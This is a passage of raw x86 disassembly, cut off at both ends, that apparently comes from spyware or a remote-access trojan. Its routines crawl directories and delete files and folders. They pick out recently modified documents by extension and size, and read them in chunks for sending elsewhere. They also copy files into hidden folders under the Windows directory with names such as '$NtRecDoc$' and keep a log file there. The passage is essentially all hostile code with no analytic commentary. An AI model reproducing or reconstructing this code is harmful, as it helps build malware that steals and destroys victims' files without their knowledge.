push    esi             ; Str
call    ebx ; strchr
mov     edx, eax
add     esp, 8
test    edx, edx
jz      short loc_40502F
mov     byte ptr [edx], 0

loc_40502F:
mov     edi, esi
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
cmp     ecx, 2
jb      short loc_405052
mov     eax, dword_40A9B8
mov     dword_40A9BC[eax*4], esi
inc     eax
mov     dword_40A9B8, eax

loc_405052:
test    edx, edx
jnz     short loc_40501B
pop     edi
pop     esi
pop     ebx

locret_405059:
retn
sub_405000 endp

align 10h



sub_405060 proc near

var_4= dword ptr -4
arg_0= dword ptr  4

push    ecx
push    ebx
push    ebp
mov     ebp, [esp+0Ch+arg_0]
push    esi
push    edi
test    byte ptr [ebp+0], 10h
jz      short loc_40507A

loc_40506F:
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
pop     ecx
retn

loc_40507A:
add     ebp, 2Ch
push    2Eh             ; Ch
push    ebp             ; Str
call    ds:strrchr
mov     [esp+1Ch+var_4], eax
mov     eax, dword_40A9B8
add     esp, 8
mov     [esp+14h+arg_0], 0
test    eax, eax
jle     loc_405136
mov     ebx, offset dword_40A9BC

loc_4050A7:
mov     edx, [ebx]
or      ecx, 0FFFFFFFFh
mov     edi, edx
xor     eax, eax
repne scasb
not     ecx
dec     ecx
cmp     ecx, 2
jb      short loc_40511C
mov     esi, ds:lstrcmpiA
push    offset asc_4099D0 ; "*.*"
push    edx             ; lpString1
call    esi ; lstrcmpiA
test    eax, eax
jz      short loc_40506F
mov     eax, [esp+14h+var_4]
test    eax, eax
jz      short loc_40510A
mov     eax, [ebx]
or      ecx, 0FFFFFFFFh
lea     edx, [eax+2]
xor     eax, eax
mov     edi, edx
repne scasb
not     ecx
dec     ecx
mov     esi, ecx
jz      short loc_405136
mov     edi, ebp
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
dec     ecx
push    edx             ; lpString2
sub     ecx, esi
lea     eax, [ecx+ebp]
push    eax             ; lpString1
call    ds:lstrcmpiA
test    eax, eax
jz      loc_40506F
jmp     short loc_40511C

loc_40510A:
mov     ecx, [ebx]
push    offset asc_4099D4 ; "*."
push    ecx             ; lpString1
call    esi ; lstrcmpiA
test    eax, eax
jz      loc_40506F

loc_40511C:
mov     eax, [esp+14h+arg_0]
mov     ecx, dword_40A9B8
inc     eax
add     ebx, 4
cmp     eax, ecx
mov     [esp+14h+arg_0], eax
jl      loc_4050A7

loc_405136:
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
pop     ecx
retn
sub_405060 endp

align 10h



sub_405140 proc near

var_8= byte ptr -8
var_7= dword ptr -7
var_3= byte ptr -3

sub     esp, 8
mov     al, byte_40AA20
lea     ecx, [esp+8+var_8]
push    6
push    ecx
mov     [esp+10h+var_8], 52h
mov     [esp+10h+var_3], al
mov     [esp+10h+var_7], 6
call    sub_402980
add     esp, 10h
retn
sub_405140 endp

align 10h



; int __cdecl sub_405170(LPCSTR lpPathName, int)
sub_405170 proc near

hFindFile= dword ptr -844h
FindFileData= _WIN32_FIND_DATAA ptr -840h
FileName= byte ptr -700h
var_500= byte ptr -500h
PathName= byte ptr -400h
Dest= byte ptr -200h
lpPathName= dword ptr  4
arg_4= dword ptr  8

mov     eax, dword_40A074
sub     esp, 844h
test    eax, eax
push    ebx
push    ebp
push    esi
push    edi
jz      short loc_405190
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 844h
retn

loc_405190:
mov     ebx, [esp+854h+lpPathName]
lea     eax, [esp+854h+Dest]
push    ebx
push    offset aS       ; "%s\\*.*"
push    eax             ; Dest
call    ds:sprintf
add     esp, 0Ch
lea     ecx, [esp+854h+FindFileData]
lea     edx, [esp+854h+Dest]
push    ecx             ; lpFindFileData
push    edx             ; lpFileName
call    ds:FindFirstFileA
mov     ebp, [esp+854h+arg_4]
cmp     eax, 0FFFFFFFFh
mov     [esp+854h+hFindFile], eax
jz      loc_405417

loc_4051D5:             ; jumptable 004052D5 default case
mov     esi, [esp+854h+hFindFile]
lea     eax, [esp+854h+FindFileData]
push    eax             ; lpFindFileData
push    esi             ; hFindFile
call    ds:FindNextFileA
test    eax, eax
jz      loc_405410
cmp     [esp+854h+FindFileData.cFileName], 2Eh
jz      short loc_4051D5 ; jumptable 004052D5 default case
lea     edi, [esp+854h+FindFileData.cFileName]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+854h+var_500]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
mov     al, byte ptr [esp+854h+FindFileData.dwFileAttributes]
and     ecx, 3
test    al, 10h
rep movsb
jz      short loc_4052A2
lea     ecx, [esp+854h+var_500]
lea     edx, [esp+854h+PathName]
push    ecx
push    ebx
push    offset aSS_0    ; "%s\\%s"
push    edx             ; Dest
call    ds:sprintf
add     esp, 10h
cmp     ebp, 4Eh
jl      short loc_405284
cmp     ebp, 4Fh
jg      short loc_405284
lea     eax, [esp+854h+PathName]
push    46h
push    eax
call    sub_4057C0
add     esp, 8
test    eax, eax
jz      loc_4053F8
mov     ecx, dword_40A060
push    0EA60h          ; dwMilliseconds
push    ecx             ; hHandle
call    ds:WaitForSingleObject
cmp     eax, 102h
jz      loc_4053C8

loc_405284:
lea     edx, [esp+854h+PathName]
push    ebp             ; int
push    edx             ; lpPathName
call    sub_405170
add     esp, 8
test    eax, eax
jz      loc_4053E0
jmp     loc_4051D5      ; jumptable 004052D5 default case

loc_4052A2:
lea     eax, [esp+854h+var_500]
lea     ecx, [esp+854h+FileName]
push    eax
push    ebx
push    offset aSS_0    ; "%s\\%s"
push    ecx             ; Dest
call    ds:sprintf
lea     eax, [ebp-4Ch]
add     esp, 10h
cmp     eax, 0Dh        ; switch 14 cases
ja      loc_4051D5      ; jumptable 004052D5 default case
xor     edx, edx
mov     dl, ds:byte_405454[eax]
jmp     ds:off_405444[edx*4] ; switch jump

loc_4052DC:             ; jumptable 004052D5 case 0
lea     eax, [esp+854h+FileName]
push    0               ; dwFileAttributes
push    eax             ; lpFileName
call    ds:SetFileAttributesA
lea     ecx, [esp+854h+FileName]
push    ecx             ; lpFileName
call    ds:DeleteFileA
jmp     loc_4051D5      ; jumptable 004052D5 default case

loc_4052FF:             ; jumptable 004052D5 cases 2,3
lea     edx, [esp+854h+FileName]
push    44h
push    edx
call    sub_4057C0
add     esp, 8
test    eax, eax
jz      loc_4053F8
mov     eax, dword_40A060
push    0EA60h          ; dwMilliseconds
push    eax             ; hHandle
call    ds:WaitForSingleObject
cmp     eax, 102h
jz      loc_4053C8
cmp     ebp, 4Fh
jnz     short loc_40535C
mov     ecx, [esp+854h+FindFileData.ftLastWriteTime.dwHighDateTime]
mov     edx, [esp+854h+FindFileData.ftLastWriteTime.dwLowDateTime]
push    ecx
lea     eax, [esp+858h+FileName]
push    edx             ; FileTime1
push    eax             ; Str
call    sub_405BA0
add     esp, 0Ch
test    eax, eax
jz      loc_4051D5      ; jumptable 004052D5 default case

loc_40535C:
lea     ecx, [esp+854h+FileName]
push    ecx             ; lpFileName
push    0               ; Offset
call    sub_405830
add     esp, 8
test    eax, eax
jz      short loc_4053E0
mov     edx, dword_40A060
push    0EA60h          ; dwMilliseconds
push    edx             ; hHandle
call    ds:WaitForSingleObject
cmp     eax, 102h
jz      short loc_4053F8
cmp     ebp, 4Fh
jnz     loc_4051D5      ; jumptable 004052D5 default case
jmp     loc_4052DC      ; jumptable 004052D5 case 0

loc_405399:             ; jumptable 004052D5 case 13
lea     edx, [esp+854h+FindFileData]
push    edx
call    sub_405060
add     esp, 4
test    eax, eax
jz      loc_4051D5      ; jumptable 004052D5 default case
lea     eax, [esp+854h+FindFileData]
lea     ecx, [esp+854h+FileName]
push    eax             ; int
push    ecx             ; Str
call    sub_405AF0
add     esp, 8
jmp     loc_4051D5      ; jumptable 004052D5 default case

loc_4053C8:
mov     eax, [esp+854h+hFindFile]
push    eax             ; hFindFile
call    ds:FindClose
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 844h
retn

loc_4053E0:
mov     ecx, [esp+854h+hFindFile]
push    ecx             ; hFindFile
call    ds:FindClose
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 844h
retn

loc_4053F8:
mov     edx, [esp+854h+hFindFile]
push    edx             ; hFindFile
call    ds:FindClose
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 844h
retn

loc_405410:             ; hFindFile
push    esi
call    ds:FindClose

loc_405417:
cmp     ebp, 4Ch
jnz     short loc_405432
push    ebx             ; lpPathName
call    ds:RemoveDirectoryA
test    eax, eax
jnz     short loc_405432
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 844h
retn

loc_405432:
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 844h
retn
sub_405170 endp

align 4
off_405444 dd offset loc_4052DC ; jump table for switch statement
dd offset loc_4052FF
dd offset loc_405399
dd offset loc_4051D5
byte_405454 db      0,     3,     1,     1 ; indirect table for switch statement
db      3,     3,     3,     3
db      3,     3,     3,     3
db      3,     2
align 10h



sub_405470 proc near

Buffer= byte ptr -200h

sub     esp, 200h
mov     byte_40AA20, 4Fh
push    edi
call    sub_405140
mov     edx, lpPathName
or      ecx, 0FFFFFFFFh
mov     edi, edx
xor     eax, eax
repne scasb
not     ecx
dec     ecx
cmp     byte ptr [edx+ecx-2], 3Ah
jnz     short loc_4054A3
cmp     byte ptr [edx+ecx-1], 5Ch
jz      short loc_40551E

loc_4054A3:
push    ebx
push    esi
lea     eax, [esp+20Ch+Buffer]
push    200h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset aNtrecdoc ; "\\$NtRecDoc$"
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+20Ch+Buffer]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; lpSecurityAttributes
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
lea     eax, [esp+210h+Buffer]
and     ecx, 3
push    eax             ; lpPathName
rep movsb
call    ds:CreateDirectoryA
lea     ecx, [esp+20Ch+Buffer]
push    ecx             ; lpFileName
call    ds:GetFileAttributesA
or      al, 2
lea     edx, [esp+20Ch+Buffer]
push    eax             ; dwFileAttributes
push    edx             ; lpFileName
call    ds:SetFileAttributesA
mov     ecx, lpPathName
lea     eax, [esp+20Ch+Buffer]
push    eax
push    ecx
call    sub_405530
add     esp, 8
pop     esi
pop     ebx

loc_40551E:
pop     edi
add     esp, 200h
retn
sub_405470 endp

align 10h



sub_405530 proc near

hFindFile= dword ptr -0E54h
SystemTime= _SYSTEMTIME ptr -0E50h
FindFileData= _WIN32_FIND_DATAA ptr -0E40h
Str= byte ptr -0D00h
var_C00= byte ptr -0C00h
var_B00= byte ptr -0B00h
PathName= byte ptr -0A00h
NewFileName= byte ptr -800h
Dest= byte ptr -600h
var_400= byte ptr -400h
ExistingFileName= byte ptr -200h
arg_0= dword ptr  4
arg_4= dword ptr  8

mov     eax, dword_40A074
sub     esp, 0E54h
test    eax, eax
push    ebx
push    ebp
push    esi
push    edi
jz      short loc_405550
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 0E54h
retn

loc_405550:
mov     eax, [esp+0E64h+arg_0]
mov     ebp, ds:sprintf
push    eax
lea     ecx, [esp+0E68h+Dest]
push    offset aS       ; "%s\\*.*"
push    ecx             ; Dest
call    ebp ; sprintf
add     esp, 0Ch
lea     edx, [esp+0E64h+FindFileData]
lea     eax, [esp+0E64h+Dest]
push    edx             ; lpFindFileData
push    eax             ; lpFileName
call    ds:FindFirstFileA
cmp     eax, 0FFFFFFFFh
mov     [esp+0E64h+hFindFile], eax
jz      loc_4057AC
mov     ebx, [esp+0E64h+arg_4]

loc_405597:
mov     esi, [esp+0E64h+hFindFile]
lea     ecx, [esp+0E64h+FindFileData]
push    ecx             ; lpFindFileData
push    esi             ; hFindFile
call    ds:FindNextFileA
test    eax, eax
jz      loc_4057A5
cmp     [esp+0E64h+FindFileData.cFileName], 2Eh
jz      short loc_405597
lea     edi, [esp+0E64h+FindFileData.cFileName]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+0E64h+Str]
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, edx
shr     ecx, 2
rep movsd
mov     ecx, eax
mov     al, byte ptr [esp+0E64h+FindFileData.dwFileAttributes]
and     ecx, 3
test    al, 10h
rep movsb
jz      loc_405691
mov     ecx, dword_40ACF8
lea     edx, [esp+0E64h+var_B00]
push    ecx
push    offset a05d     ; "%05d"
push    edx             ; Dest
call    ebp ; sprintf
mov     eax, dword_40ACF8
add     esp, 0Ch
mov     ecx, eax
inc     eax
cmp     ecx, 1869Fh
mov     dword_40ACF8, eax
jle     short loc_405622
mov     dword_40ACF8, 0

loc_405622:
mov     eax, [esp+0E64h+arg_0]
lea     edx, [esp+0E64h+Str]
push    edx
push    eax
lea     ecx, [esp+0E6Ch+var_400]
push    offset aSS_0    ; "%s\\%s"
push    ecx             ; Dest
call    ebp ; sprintf
lea     edx, [esp+0E74h+var_B00]
lea     eax, [esp+0E74h+PathName]
push    edx
push    ebx
push    offset aSS_1    ; "%s\\$%s"
push    eax             ; Dest
call    ebp ; sprintf
add     esp, 20h
lea     ecx, [esp+0E64h+PathName]
push    0               ; lpSecurityAttributes
push    ecx             ; lpPathName
call    ds:CreateDirectoryA
lea     edx, [esp+0E64h+PathName]
lea     eax, [esp+0E64h+var_400]
push    edx
push    eax
call    sub_405530
add     esp, 8
test    eax, eax
jz      loc_40578D
jmp     loc_405597

loc_405691:
lea     ecx, [esp+0E64h+SystemTime]
push    ecx             ; lpSystemTime
call    ds:GetLocalTime
mov     eax, dword ptr [esp+0E64h+SystemTime.wMinute]
mov     edx, dword_40ACF8
mov     ecx, [esp+1Ch]
and     eax, 0FFFFh
push    edx
mov     edx, dword ptr [esp+0E68h+SystemTime.wDay]
push    eax
mov     eax, dword ptr [esp+0E6Ch+SystemTime.wMonth]
and     ecx, 0FFFFh
and     edx, 0FFFFh
push    ecx
and     eax, 0FFFFh
push    edx
push    eax
lea     ecx, [esp+0E78h+var_C00]
push    offset a02u02u02u02u05 ; "%02u%02u%02u%02u%05d"
push    ecx             ; Dest
call    ebp ; sprintf
mov     eax, dword_40ACF8
add     esp, 1Ch
mov     edx, eax
inc     eax
cmp     edx, 1869Fh
mov     dword_40ACF8, eax
jle     short loc_4056FE
mov     dword_40ACF8, 0

loc_4056FE:
lea     eax, [esp+0E64h+Str]
push    2Eh             ; Ch
push    eax             ; Str
call    ds:strrchr
mov     edx, [esp+0E6Ch+arg_0]
lea     ecx, [esp+0E6Ch+Str]
mov     esi, eax
push    ecx
push    edx
lea     eax, [esp+0E74h+ExistingFileName]
push    offset aSS_0    ; "%s\\%s"
push    eax             ; Dest
call    ebp ; sprintf
add     esp, 18h
test    esi, esi
jnz     short loc_405753
lea     ecx, [esp+0E64h+var_C00]
lea     edx, [esp+0E64h+NewFileName]
push    ecx
push    ebx
push    offset aSS_0    ; "%s\\%s"
push    edx             ; Dest
call    ebp ; sprintf
add     esp, 10h
jmp     short loc_405770

loc_405753:
inc     esi
lea     eax, [esp+0E64h+var_C00]
push    esi
push    eax
push    ebx
lea     ecx, [esp+0E70h+NewFileName]
push    offset aSSS     ; "%s\\%s.%s"
push    ecx             ; Dest
call    ebp ; sprintf
add     esp, 14h

loc_405770:
lea     edx, [esp+0E64h+NewFileName]
push    0               ; bFailIfExists
lea     eax, [esp+0E68h+ExistingFileName]
push    edx             ; lpNewFileName
push    eax             ; lpExistingFileName
call    ds:CopyFileA
jmp     loc_405597

loc_40578D:
mov     ecx, [esp+0E64h+hFindFile]
push    ecx             ; hFindFile
call    ds:FindClose
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 0E54h
retn

loc_4057A5:             ; hFindFile
push    esi
call    ds:FindClose

loc_4057AC:
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 0E54h
retn
sub_405530 endp

align 10h



sub_4057C0 proc near

var_400= byte ptr -400h
var_3FF= dword ptr -3FFh
var_3FB= byte ptr -3FBh
arg_0= dword ptr  4
arg_4= byte ptr  8

sub     esp, 400h
push    ebx
push    esi
mov     esi, [esp+408h+arg_0]
push    edi
mov     edi, esi
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     ebx, [esp+40Ch+var_3FB]
repne scasb
mov     al, [esp+40Ch+arg_4]
mov     edi, esi
not     ecx
dec     ecx
mov     [esp+40Ch+var_400], al
mov     edx, ecx
or      ecx, 0FFFFFFFFh
xor     eax, eax
add     edx, 6
repne scasb
not     ecx
sub     edi, ecx
mov     [esp+40Ch+var_3FF], edx
mov     eax, ecx
mov     esi, edi
mov     edi, ebx
push    edx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
lea     ecx, [esp+410h+var_400]
push    ecx
call    sub_402980
add     esp, 8
pop     edi
pop     esi
pop     ebx
add     esp, 400h
retn
sub_4057C0 endp

align 10h



; int __cdecl sub_405830(int Offset, LPCSTR lpFileName)
sub_405830 proc near

var_2008= dword ptr -2008h
var_2004= byte ptr -2004h
DstBuf= byte ptr -2000h
var_1FFF= dword ptr -1FFFh
Offset= dword ptr  4
lpFileName= dword ptr  8

mov     eax, 2008h
call    __alloca_probe
mov     eax, dword_40A088
push    ebx
push    ebp
push    esi
sub     eax, 53h
push    edi
mov     [esp+2018h+var_2008], 1
mov     bl, 59h
jz      short loc_40586E
dec     eax
jz      short loc_405867
sub     eax, 5
jz      short loc_405861
mov     [esp+2018h+DstBuf], 45h
jmp     short loc_405873

loc_405861:
mov     [esp+2018h+DstBuf], bl
jmp     short loc_405873

loc_405867:
mov     [esp+2018h+DstBuf], 54h
jmp     short loc_405873

loc_40586E:
mov     [esp+2018h+DstBuf], 53h

loc_405873:
mov     ebp, [esp+2018h+lpFileName]
push    0               ; hTemplateFile
push    80h             ; dwFlagsAndAttributes
push    3               ; dwCreationDisposition
push    0               ; lpSecurityAttributes
push    3               ; dwShareMode
push    80000000h       ; dwDesiredAccess
push    ebp             ; lpFileName
call    ds:CreateFileA
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jnz     short loc_4058E0
cmp     [esp+2018h+DstBuf], bl
jnz     short loc_4058C7
lea     eax, [esp+2018h+DstBuf]
push    6
push    eax
mov     [esp+2020h+var_1FFF], 6
call    sub_402980
add     esp, 8
mov     eax, 1
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 2008h
retn

loc_4058C7:
mov     byte_40AA20, 55h
call    sub_405140
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 2008h
retn

loc_4058E0:             ; lpFileSizeHigh
push    0
push    esi             ; hFile
call    ds:GetFileSize
mov     ebx, [esp+2018h+Offset]
mov     ecx, 5
sub     ecx, ebx
push    esi             ; hObject
add     eax, ecx
mov     [esp+201Ch+var_1FFF], eax
call    ds:CloseHandle
lea     edx, [esp+2018h+DstBuf]
push    5
push    edx
call    sub_402980
add     esp, 8
test    eax, eax
jnz     short loc_405922
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 2008h
retn

loc_405922:
push    offset Mode     ; "rb"
push    ebp             ; Filename
call    ds:fopen
mov     edi, eax
push    0               ; Origin
push    ebx             ; Offset
push    edi             ; File
call    ds:fseek
mov     eax, dword_40A074
add     esp, 14h
test    eax, eax
jnz     short loc_405999
mov     ebx, ds:fread

loc_40594C:             ; File
push    edi
push    2000h           ; Count
lea     eax, [esp+2020h+DstBuf]
push    1               ; ElementSize
push    eax             ; DstBuf
call    ebx ; fread
lea     ecx, [esp+2028h+var_2004]
lea     edx, [esp+2028h+DstBuf]
mov     esi, eax
push    ecx
push    edx
lea     eax, [esp+2030h+DstBuf]
push    2000h
push    eax
call    sub_4037B0
lea     ecx, [esp+2038h+DstBuf]
push    esi
push    ecx
call    sub_4028D0
add     esp, 28h
test    eax, eax
jz      short loc_405999
cmp     esi, 2000h
jnz     short loc_4059BA
mov     eax, dword_40A074
test    eax, eax
jz      short loc_40594C

loc_405999:
mov     [esp+2018h+var_2008], 0

loc_4059A1:             ; File
push    edi
call    ds:fclose
mov     eax, [esp+201Ch+var_2008]
add     esp, 4
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 2008h
retn

loc_4059BA:
cmp     dword_40A088, 41h
jnz     short loc_4059A1
push    edi             ; File
call    ds:fclose
add     esp, 4
push    0               ; dwFileAttributes
push    ebp             ; lpFileName
call    ds:SetFileAttributesA
push    ebp             ; lpFileName
call    ds:DeleteFileA
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 2008h
retn
sub_405830 endp

align 10h



sub_4059F0 proc near
mov     eax, lpPathName
mov     edx, [eax]
lea     ecx, [eax+4]
push    ecx             ; lpFileName
push    edx             ; Offset
call    sub_405830
add     esp, 8
retn
sub_4059F0 endp

align 10h



sub_405A10 proc near

arg_0= dword ptr  4

mov     eax, lpPathName
push    46h
push    eax
call    sub_4057C0
mov     ecx, dword_40A060
add     esp, 8
push    0EA60h          ; dwMilliseconds
push    ecx             ; hHandle
call    ds:WaitForSingleObject
cmp     eax, 102h
jz      short locret_405A58
mov     edx, [esp+arg_0]
mov     eax, lpPathName
push    edx             ; int
push    eax             ; lpPathName
call    sub_405170
add     esp, 8
mov     byte_40AA20, 47h
jmp     sub_405140

locret_405A58:
retn
sub_405A10 endp

align 10h



sub_405A60 proc near
push    esi
push    edi
push    0FFh            ; uSize
push    offset Filename ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset aLwxrsvTem ; "\\LwxRsv.tem"
or      ecx, 0FFFFFFFFh
xor     eax, eax
push    offset Filename ; lpFileName
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edx, ecx
mov     edi, offset Filename
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
mov     edi, ds:DeleteFileA
call    edi ; DeleteFileA
mov     eax, lpPathName
push    5Ch             ; Ch
push    eax             ; Str
call    ds:strrchr
mov     esi, eax
push    esi
call    sub_405000
mov     byte ptr [esi], 0
mov     ecx, lpPathName
push    59h             ; int
push    ecx             ; lpPathName
call    sub_405170
push    offset Filename ; lpFileName
push    0               ; Offset
call    sub_405830
add     esp, 1Ch
push    offset Filename ; lpFileName
call    edi ; DeleteFileA
pop     edi
pop     esi
retn
sub_405A60 endp

align 10h



; int __cdecl sub_405AF0(void *Str, int)
sub_405AF0 proc near

Str= dword ptr  4
arg_4= dword ptr  8

push    esi
push    offset aAb      ; "ab"
push    offset Filename ; Filename
call    ds:fopen
mov     esi, eax
add     esp, 8
test    esi, esi
jz      short loc_405B4E
mov     edx, [esp+4+Str]
push    ebx
push    edi
mov     edi, edx
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
mov     edi, ds:fwrite
push    esi             ; File
not     ecx
push    ecx             ; Count
push    1               ; Size
push    edx             ; Str
call    edi ; fwrite
mov     ebx, [esp+1Ch+arg_4]
push    esi             ; File
push    8               ; Count
push    1               ; Size
lea     eax, [ebx+14h]
push    eax             ; Str
call    edi ; fwrite
push    esi             ; File
push    4               ; Count
add     ebx, 20h
push    1               ; Size
push    ebx             ; Str
call    edi ; fwrite
push    esi             ; File
call    ds:fclose
add     esp, 34h
pop     edi
pop     ebx

loc_405B4E:
pop     esi
retn
sub_405AF0 endp




sub_405B50 proc near
mov     eax, lpPathName
push    esi
push    edi
push    200h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset unk_409468
or      ecx, 0FFFFFFFFh
xor     eax, eax
push    4Fh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, lpPathName
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
call    sub_405A10
add     esp, 4
pop     edi
pop     esi
retn
sub_405B50 endp

align 10h



; int __cdecl sub_405BA0(char *Str, FILETIME FileTime1)
sub_405BA0 proc near

FileTime= _FILETIME ptr -18h
SystemTime= _SYSTEMTIME ptr -10h
Str= dword ptr  4
FileTime1= FILETIME ptr  8

sub     esp, 18h
push    ebx
push    ebp
mov     ebp, [esp+20h+Str]
push    esi
push    edi
push    2Eh             ; Ch
push    ebp             ; Str
call    ds:strrchr
mov     edi, ds:lstrcmpiA
add     esp, 8
mov     ebx, eax
mov     esi, offset aBxey ; "^Bxey"

loc_405BC4:
cmp     byte ptr [esi], 0
jz      loc_405CBA
test    ebx, ebx
jz      short loc_405BE1
lea     eax, [esi+2]
lea     ecx, [ebx+1]
push    eax             ; lpString2
push    ecx             ; lpString1
call    edi ; lstrcmpiA
test    eax, eax
jz      short loc_405BF8
jmp     short loc_405BED

loc_405BE1:
push    offset asc_4099D4 ; "*."
push    esi             ; lpString1
call    edi ; lstrcmpiA
test    eax, eax
jz      short loc_405BF8

loc_405BED:
add     esi, 10h
cmp     esi, offset unk_40962C
jl      short loc_405BC4

loc_405BF8:             ; hTemplateFile
push    0
push    80h             ; dwFlagsAndAttributes
push    3               ; dwCreationDisposition
push    0               ; lpSecurityAttributes
push    3               ; dwShareMode
push    80000000h       ; dwDesiredAccess
push    ebp             ; lpFileName
call    ds:CreateFileA
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jz      loc_405CBA
push    0               ; lpFileSizeHigh
push    esi             ; hFile
call    ds:GetFileSize
push    esi             ; hObject
mov     edi, eax
call    ds:CloseHandle
cmp     edi, 7D0h
jb      loc_405CBA
cmp     edi, 0F4240h
ja      short loc_405CBA
push    offset aLddata  ; "\\$LDDATA$\\"
push    ebp             ; Str
call    ds:strstr
add     esp, 8
test    eax, eax
jz      short loc_405C62
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
add     esp, 18h
retn

loc_405C62:
lea     edx, [esp+28h+SystemTime]
push    edx             ; lpSystemTime
call    ds:GetSystemTime
lea     eax, [esp+28h+FileTime]
lea     ecx, [esp+28h+SystemTime]
push    eax             ; lpFileTime
push    ecx             ; lpSystemTime
call    ds:SystemTimeToFileTime
mov     ebp, [esp+28h+FileTime.dwLowDateTime]
mov     ebx, [esp+28h+FileTime.dwHighDateTime]
add     ebp, 0D8A14000h
lea     edx, [esp+28h+FileTime]
lea     eax, [esp+28h+FileTime1]
push    edx             ; lpFileTime2
adc     ebx, 0FFFFF5C8h
push    eax             ; lpFileTime1
mov     [esp+30h+FileTime.dwLowDateTime], ebp
mov     [esp+30h+FileTime.dwHighDateTime], ebx
call    ds:CompareFileTime
xor     ecx, ecx
pop     edi
test    eax, eax
setnl   cl
pop     esi
pop     ebp
mov     eax, ecx
pop     ebx
add     esp, 18h
retn

loc_405CBA:
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
add     esp, 18h
retn
sub_405BA0 endp

align 10h



sub_405CD0 proc near

Count= dword ptr -104h
Buffer= byte ptr -100h

mov     eax, dword_40A078
sub     esp, 104h
test    eax, eax
push    ebx
push    esi
push    edi
jnz     loc_405E30
mov     eax, lpPathName
or      ecx, 0FFFFFFFFh
mov     dword_40A078, 1
lea     edx, [eax+4]
xor     eax, eax
mov     edi, edx
repne scasb
not     ecx
dec     ecx
mov     ebx, ecx
cmp     ebx, 114h
jnb     loc_405EE1
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, dword_40A088
mov     edx, ecx
mov     esi, edi
mov     edi, offset FileName
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
cmp     eax, 56h
rep movsb
jnz     loc_405DCC
lea     eax, [esp+110h+Buffer]
push    100h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
or      ecx, 0FFFFFFFFh
mov     edi, offset asc_409764 ; "\\"
xor     eax, eax
lea     edx, [esp+110h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     edx, [esp+110h+Buffer]
and     ecx, 3
rep movsb
mov     edi, offset FileName
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
lea     edi, [esp+110h+Buffer]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, offset FileName
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb

loc_405DCC:             ; dwFileAttributes
push    0
push    offset FileName ; lpFileName
call    ds:SetFileAttributesA
mov     ecx, lpPathName
cmp     dword ptr [ecx], 0
jz      short loc_405DEB
push    offset aAb      ; "ab"
jmp     short loc_405DF0

loc_405DEB:
push    offset aWb      ; "wb"

loc_405DF0:             ; Filename
push    offset FileName
call    ds:fopen
mov     edi, eax
add     esp, 8
test    edi, edi
jnz     short loc_405E1A
mov     byte_40AA20, 45h
call    sub_405140
